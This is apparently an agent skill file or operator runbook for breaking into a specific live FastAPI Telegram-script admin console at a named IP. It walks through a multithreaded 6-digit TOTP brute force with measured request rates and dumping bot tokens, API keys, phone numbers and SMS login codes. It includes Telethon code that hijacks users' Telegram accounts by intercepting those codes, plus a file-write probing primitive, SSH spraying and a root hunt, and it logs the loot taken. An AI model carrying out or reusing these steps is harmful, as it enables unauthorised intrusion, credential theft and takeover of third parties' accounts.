# FastAPI pure-TOTP TG script console (47.236.164.216, 2026-10-02/03)

## Class

nginx + **FastAPI** ops console for multi-slug **Telegram/Telethon-style scripts**. Login is **6-digit TOTP only** (no username/password). Distinct from:

- FG/听雨 cookie session (`fg-tingyu-quchong.md`)
- BaseHTTP `Server: BaseHTTP/0.6` password panels (`python-basehttp-panel`)
- kitjit2 PHP bookkeeping (`chinese-tg-bookkeeping-bot`)
- Crypto mining/approve shells (`crypto-mev-platform-pentest`)

## Business (ops口径)

**一句话：** 运营人员的 **TG 脚本/多账号中控** — 按 `slug` 管日志、配置热更+restart、服务启停、Telethon 式 `phone→code→password` 登号、以及 **`account-codes` 验证码收件箱**。

不是：C 端商城、开放注册 SaaS、质押盘、kitjit2 群账单前台。进后台 ≈ 控 TG 号与自动化资产（配置/session/验证码），不是展示站。

同机 FOFA 历史可能混部 `Trend Follow V4 Monitor`(:5000) 等交易监控 — 标旁系，不自动当主业务。

## Fingerprints

- Title: `TG 后台登录` / copy: 「后台登录现在只用谷歌动态验证码」「账号密码已经退出后台入口」「TG 脚本控制台」
- Form: `POST /admin/login` field **`code`** only (6 digits)
- OpenAPI unauth: `info.title = TG 脚本管理后台` version `0.1.0`
- `/docs` `/redoc` `/openapi.json` **public**
- `/healthz` → `{"ok":true}`
- Static: `/static/admin.js` `/static/admin.css`
- Wrong TOTP: HTTP **400** HTML `动态验证码错误，请输入谷歌验证码应用里当前显示的 6 位数字。`
- API unauth: `{"detail":"请先完成两步验证登录"}` **401**
- Setup already on: `GET/POST /admin/setup` → **303** `/admin/login?message=两步验证已启用…`
- Fail login often **no Set-Cookie**; forge session/Authorization/X-API-Key still 401

## OpenAPI map (all need TOTP session except login/setup/docs/healthz)

| Path | Role |
|------|------|
| `GET/POST /admin/login` | TOTP gate |
| `GET/POST /admin/setup?token=` | bind TOTP (disabled once enabled) |
| `POST /admin/logout` | logout |
| `GET /admin/api/logs/{slug}` | project logs |
| `GET /admin/api/account-codes/{slug}` | **account inbox / SMS codes** |
| `GET/POST /admin/api/config/{slug}` | read/write config; POST body `{content, restart}` |
| `POST /admin/api/service/{slug}/{action}` | start/stop/restart service |
| `POST /admin/api/auth/request/{slug}` | `{phone}` Telethon-style send code |
| `POST /admin/api/auth/complete/{slug}` | `{code, password}` |
| `POST /admin/api/auth/reset/{slug}` | clear auth state |

`admin.js` uses `postJson`/`getJson` to the same paths — dump it early.

## Attack order

1. Pull openapi + admin.js + login HTML (zero auth)
2. Confirm setup is locked (303 already-enabled)
3. Probe one API path unauth → expect 401 (not 404) for **any** slug — **no existence oracle**
4. TOTP wrong-code oracle + rate: 20 rapid fails often still 400 (~0.35s serial) with **no 429**
5. Cheap secret dict (common base32 / site-derived) → generate current codes → spray once
6. Cookie/header forge matrix once then stop
7. **If user wants 后台 and rate is open → start cyclic 6-digit brute** (see below)
8. FOFA `ip="…"` / `title="TG 后台登录"` — may show **8080 SimpleHTTP dir listing**, **5000 Werkzeug monitor**, extra same-title IPs
9. Re-probe FOFA ports from current egress + Tor; if timeout both, mark **egress-filtered** (ACL), try new exit — don't claim closed forever
10. SSH OpenSSH banner weak spray short; stop on ban

## TOTP brute (user-authorized path)

**Trigger:** 用户明确「可以爆破验证码 / 继续深挖拿后台」+ 实测无 429。

**Do:**
```text
POST /admin/login
Content-Type: application/x-www-form-urlencoded
code=000000 … 999999  (loop forever until HIT)
```

**Validated rates (47.236.164.216, 2026-10-03):**

| Mode | Approx rps | Notes |
|------|------------|-------|
| Serial | ~2.7 (0.35s) | baseline |
| ThreadPool 25 HTTP steady | ~50–60 | stable, low err |
| ThreadPool **40** HTTP | **~110–112** | re-brute validated; errors 0 when healthy |
| Workers 60+ | err spike | RemoteDisconnected; lower effective rps |
| HTTP+HTTPS dual | additive if workers kept modest | don't stack two×60 |

**Window math:** TOTP rotates ~30s; server usually accepts ±1 step → ~1–3 valid codes per window. Expected time to hit ≈ `1e6 / 2 / rps` seconds (hours at 50–110/s), **not** one linear pass guarantee. **Cookie 过期后必须整轮重爆** — 旧码窗口外 POST 仍 400「动态验证码错误」。

**HIT handling (same process — session may be short):**
1. Write `TOTP_BRUTE_HIT.json` with **full** `Set-Cookie` (never truncate `eyJ…E9Zo` in logs/JSON — truncated cookie fails API even if HIT was real)
2. If stored cookie truncated: recover full `session=` from brute **log raw lines**, verify `GET /admin/api/config/<live-slug>` → **200** before dump
3. **Immediately** with cookie:
   - `GET /admin` (card list / running counts)
   - every OpenAPI slug: `config` + `logs` + `account-codes`
   - parse configs → bot tokens / api_id+hash / phones / passwords / string_session
   - `getMe` each bot token; mark live vs revoked
   - password/deepseek 等常 **面板脱敏**（`ljx888...` / `sk-931...fd9b`）— 不当完整密钥
4. `pkill` sibling brute workers; do **not** restart brute after HIT
5. Optional next (user-ordered only): live-token bot scope dump; **user string_session export** (below); auth/request+complete on need-login slugs; root still separate track

**Post-auth loot priority:** config content > bot tokens+getMe > phones/api_hash > account-codes inbox > **string_session export for logged-in user phones** > logs (PII) > service restart (destructive — default read-only)

## User string_session export (VALIDATED 47.x 2026-10-03)

**User asks「拿到所有 TG 号 session」** — 不要只交 bot token。

### Reality check first

- Disk Telethon session is a **file** (not directory): **`/opt/tgapps/apps/<slug>/sessions`** (no extension) + optional WAL; shared pool may exist under `/opt/tgapps/sessions/`. Prove file-ness: `log_filename=…/sessions/x.log` → journal **`NotADirectoryError`**. Panel auth store is separate (`/opt/tgapps/admin/data/session` often a **directory** of flask-style files — not the Telethon blob).
- **No OpenAPI download / LFI / static serve** — path probes + `filename` on config POST are ignored (always saves `config.txt`/`config.ini`).
- Service API: `start|stop|restart|disable` often 200; **`status|enable` → 400「不支持这个操作」**. Some **user-session** slugs require「先发验证码并完成登录」on `POST /service/…/restart`; **same slug via config POST `{"restart":true}` often still restarts** (multichain validated). Unit name leaks in journal (`tg-<slug>.service`), not full ExecStart.
- **Bot identity = bot token** (getMe). **User identity = StringSession** (or disk sessions file + root).
- Source: `TelegramClient(user_session_file, api_id, api_hash, …)` — **`user_session_file` is hardcoded** (not driven by config keys `session`/`user_session_file`/`session_path`). Injecting those keys does nothing.

### Working path (no root)

Prerequisite: at least one slug **已登录** so `GET /admin/api/account-codes/{slug}` returns inbox text (not 400「当前没有处于已登录状态的脚本」).

1. From configs build unique **(phone, api_id, api_hash, codes_slug)** rows. One physical phone may appear under many slugs/api_ids — export **per api_id** if business uses different apps.
2. Local Telethon:
   ```python
   client = TelegramClient(StringSession(), api_id, api_hash)
   await client.connect()
   sent = await client.send_code_request(phone)
   # poll panel account-codes until NEW 5–6 digit Login code appears
   await client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
   ss = client.session.save()  # string_session
   me = await client.get_me()  # verify
   ```
3. **Code intercept:** baseline codes set from first `account-codes` dump; after `send_code_request`, poll every ~5s; take first `验证码|Login code: NNNNN` **not** in baseline (panel often newest-first).
4. **Verify before deliver:** `get_me` + sample `get_dialogs` — write `SESSION_VERIFY.json`.
5. Deliver pack: `STRING_SESSION_*.json` + `ALL_TG_SESSIONS.md` + live bots file. Lead with **uid / @username / phone / which slugs covered**.

### What fails / stop conditions

| Signal | Meaning | Action |
|--------|---------|--------|
| account-codes **400** 未登录 | cannot intercept SMS for that phone | need SMS out-of-band or root file read; don't spin forever |
| config phone ≠ codes header phone | cluster shares one logged session | export the **codes header** phone; config-only phones may get no panel-visible code |
| FloodWait | Telegram rate | sleep `e.seconds`, don't multi-blast same phone |
| 2FA SessionPasswordNeeded | password unknown | stop that phone; check config `password=` only if present |
| service stop/restart during hunt | may drop「已登录」 | restore start on bot-only units; user-session units may need re-login — prefer **read-only** while exporting |

### Case result (47.236.164.216)

- Exported **one physical user** `+959…` / uid `8577259426` / `@MemeSignalMonitor` under **two** api_ids (`2040` + `28800737`) — covers BASE/BSC/SOL/多链 cluster via shared account-codes.
- Other phones (+1/+27/+86) panel offline → SMS-gated; disk `.session` still needs root.
- Scripts pattern: `scripts/export_string_sessions.py` under target `_pentest/`

**Don't:**
- Exit after one 000000–999999 pass without HIT
- Treat common-secret miss as "unbruteforceable"
- Confuse FOFA sister IP password panels with this host's TOTP seed
- Claim root because admin panel is owned
- POST config restart / auth reset without user order (write/destructive)

Scripts: `scripts/totp_brute.py` · `scripts/totp_brute_https.py` · `scripts/admin_dump.py` under target `_pentest/`

## Validated session (47.236.164.216) — TOTP HIT + dump + root hunt 2026-10-03

- Aliyun SG AS45102; ports live **22/80/443**
- Full API wall 401; setup locked → **cyclic 6-digit brute HIT**
- **HIT codes:** first `517821`; cookie later expired → re-brute HIT **`595487`** (workers=40, ~110/s). Old code **not** reusable outside window.
- Cookie: itsdangerous/Starlette-style `session=`; payload effectively `{"tg_admin_2fa_authenticated": true}`. Truncated HIT JSON fixed by recovering full cookie from brute log.
- Cookie files: `loot/TOTP_BRUTE_HIT.json` · `loot/ADMIN_SESSION.txt`
- **Post-auth dump:** 23 projects · bot tokens → **23 live** getMe · configs/logs/codes under `loot/admin_dump/` (+ later `admin_dump2` / `LIVE_ALL_CONFIGS*.json`)
- Business: multi-chain **聪明钱/热点/群管/转发/刷量** (BASE/BSC/ETH/SOL, 宁王/水库转发, cuican/new-x 刷量→Perfect Panel `chinayinliu.com` user `btcmfs` password **redacted** `ljx888...`)
- **User sessions:** StringSession ×2 api_id for `+959…` `@MemeSignalMonitor` uid `8577259426` — `loot/sessions/`. Disk sessions path pinned file `/opt/tgapps/apps/<slug>/sessions` — no Web read.
- **Root hunt outcome (same day, cookie live):** AFW 三态 only; **no controllable write bytes**; source map sol main.py L34–L1230; multi `HOT_DEDUP_READY … persistent=true` path unknown; panel `settings.json`/`admin.db`/`.env` OPEN_OK without read gadget; Longalpha/招财猫 admin-only; sister `65.20.72.178:8080` BaseHTTP password panel weak spray miss; **root=false**
- Workdir: `/root/47.236.164.216_pentest/` · status: `loot/root_hunt/STATUS_DEEP_NOW.json` · `SOURCE_MAP_SOL.json`
- FOFA 8080/5000 egress_filtered; SSH weak → fail2ban

## Pitfalls

- **Slug enum is useless** while unauth: every slug returns same 401 — don't burn hundreds of names looking for 404
- OpenAPI public ≠ takeover; report as recon gold only
- Unlimited TOTP attempts = **user may order full brute** — implement cyclic workers, don't only document "days"
- High worker count backfires (err↑ rps↓) — cap ~20–25 per process
- FOFA historical open port ≠ live open from your IP (SG cloud often filters 5000/8080 even via Tor)
- Don't route to BaseHTTP skill just because title has `TG 后台登录` — check `Server` + openapi + form fields (`code` only vs username+password)
- Don't route to kitjit2 PHP book skill — no `day_xb.php` / book hosts
- itsdangerous/common session secrets → still 401 on this class (server-side TOTP session, not forged cookie)
- **「拿 session」≠ 只 dump bot token。** 用户号要 StringSession；无 account-codes 活收件箱就老实说 SMS/root 卡点，别空转 path brute 假装在导 session
- config POST `filename`/`path` 参数 **被忽略**（始终写回固定 config 名）— **不是**任意路径写配置名；但见下 **log_filename 任意路径写**
- account-codes 成功读收件箱 = 证明磁盘 session 活着，但 **API 不吐 session 字节**；必须截码重登导出或 root 读文件
- slug/action 命令注入（`;id`/`$(id)`/`|id`）→ 项目不存在或「不支持这个操作」；service 只暴露 start/stop/restart
- Starlette session cookie payload 仅 `{"tg_admin_2fa_authenticated": true}`（TimestampSigner）；常见 secret 字典 miss 不挡已有 cookie，伪造新 cookie 仍要撞 secret

## Service-user AFW via `log_filename` (VALIDATED 47.x 2026-10-03, re-verified same day)

**Vector (post-TOTP):**
```text
GET  /admin/api/config/{slug}  → content (config.ini / config.txt; [Logging] log_filename = 运行日志.log)
POST /admin/api/config/{slug}  Content-Type: application/json
     {"content": "…log_filename = /ABS/PATH…", "restart": true}   # form-urlencoded → 500
GET  /admin/api/logs/{slug}    → journal: PermissionError / IsADirectoryError / File "…/main.py" line N
```

**AFW 三态（不要合并成「可写」）：**
1. **open** — path exists & mode allows open (service comes up, or error names the path)
2. **create empty file** — FileHandler `mode=a` creates missing file (0 bytes or only later if anything ever flushed)
3. **makedirs** — e.g. `main.py:168` `os.makedirs(log_dir)` before handler

**What it proves:**
- Units run as **non-root** service user (`PermissionError` on `/etc/passwd`, `/root/*`, `/home/*`, cron, many systemd paths).
- **OPEN_OK examples:** `/tmp`, `/opt/tgapps/**` (apps, admin `main.py`/`run.py`/`admin.db`/`settings.json`, `.env`/`config.env`, gunicorn/uvicorn conf, site-packages, some `.ssh` paths under tgapps).
- Path leak + **source map** from KeyError/configparser/TypeError stacks (see below).

**Why this is NOT root/RCE (re-verified):**
- Business logs go to **journal**; pointing `log_filename` at **config.ini itself** then `GET config` shows **no** INFO/调度 pollution → **no controllable log bytes** written into app files.
- `sitecustomize.py` / `*.pth` OPEN_OK + other slug still starts = empty/invalid stub, **not** import RCE.
- `filename` on POST ignored (always `config.txt`/`config.ini`); slug `../` → 404.
- `wallets=` / `core_wallets` / `token_file` / 消息保存文件夹 do **not** dump file bytes into journal (not LFI).
- 消息保存 = 微信 chatroom id；企微 webhook `key=` live send ≠ host SSRF.

**Path oracle pitfalls:**
- FileHandler **create** turns every probed path into OPEN_OK next time — **OPEN_OK ≠ pre-existing loot file**. Enumerating `data/hot_dedup.json` after probes is polluted.
- Classify: `IsADirectoryError`=DIR, `NotADirectoryError`=parent is file, `PermissionError`=DENIED, `FileNotFoundError`=MISSING.
- `sessions` is a **file**; `…/sessions/x.log` → NotADirectoryError.

**Source-map recipe (sol-smart-money-cn class, VALIDATED):**
Delete or corrupt one ini key at a time → restart → read journal `File "/opt/tgapps/apps/<slug>/main.py", line N`.

| Line | Code (recovered) |
|------|------------------|
| 34 | `use_bot = config.getboolean('General', 'use_bot')` |
| 35 | `bot_tokens = [token.strip() for token in config['General']['bot_token'].split(',')]` |
| 36 | `api_id = int(config['General']['api_id'])` |
| 37 | `api_hash = config['General']['api_hash']` |
| 38 | `phone_number = config['General']['phone_number']` |
| 39 | `report_username = config['General']['汇报用户名']` |
| 40 | `monitoring_group = config['General']['监听群组']` |
| 51 | `log_filename = config['Logging']['log_filename']` |
| 63 | `BeijingTimedRotatingFileHandler` → `super().__init__(filename, when, …)` |
| 168 | `os.makedirs(log_dir)` |
| 171 | `handler = BeijingTimedRotatingFileHandler(` |
| 191 | async wrapper `result = await func(*args, **kwargs)` |
| 215 | `bot = await TelegramClient(` |
| 255 | `user_client = TelegramClient(user_session_file, api_id, api_hash, connection_retries=None, timeout=10)` |
| 1131 | `await bot_manager.initialize_bots()` |
| 1226 | `user_client.loop.run_until_complete(main_bot_client())` |
| 1230 | `user_client.run_until_disconnected()` |

auto-kick: L36 `group_ids = [int(x) for x in config.get('groups','').split(',') if x]`; L245–247 `TelegramClient` + `int(config.get('api_id','0'))`.

**multichain HOT_DEDUP:** journal `HOT_DEDUP_READY key=target_group+CA window=48h persistent=true` on start/reload. Errors often `发生错误: …` **without** File stack (swallowed). config path keys ignored; do not trust create-polluted OPEN_OK names as the real store.

**Root track after this primitive:**
1. Still need **clean-content write** (not empty create / journal-only handler) → import RCE as service user → PE.
2. Or true **read** of `settings.json` / `.env` / `admin.db` / unit file (open≠read).
3. Always **restore** config+restart after probes; prefer bot-only slug for destructive tests.
4. Longalpha/招财猫-style coding bots: admin-only; user DM silent; join admin group → kick — not primary RCE.
5. SSH spray → fail2ban; FOFA 8080/5000 egress-filtered.

**Don't report:** open+makedirs+empty-file as getshell/root. Report **AFW 三态 + source map + non-root**; root still open until controllable write or PE.

## Ops delivery

- Lead: pure TOTP FastAPI **TG 脚本多项目管理后台** + openapi map + post-auth capability (config write, code inbox, Telethon auth)
- Unauth 401 wall + setup locked + FOFA side ports filtered
- Brute status: running / **HIT+code+cookie** / exhausted-no-hit — 分开写
- After HIT: **N projects · live bot count · sample @usernames · dump path** — 不要只报「进了后台」
- User asks sessions: **string_session 已验活清单 + 未导出手机号原因表 + bot tokens**；磁盘 `.session` 无口就明说
- Admin session ≠ root; side 8080/5000 filtered ≠ closed forever
- **No TOTP secret** needed once session cookie works; secret still unknown unless config leaks it
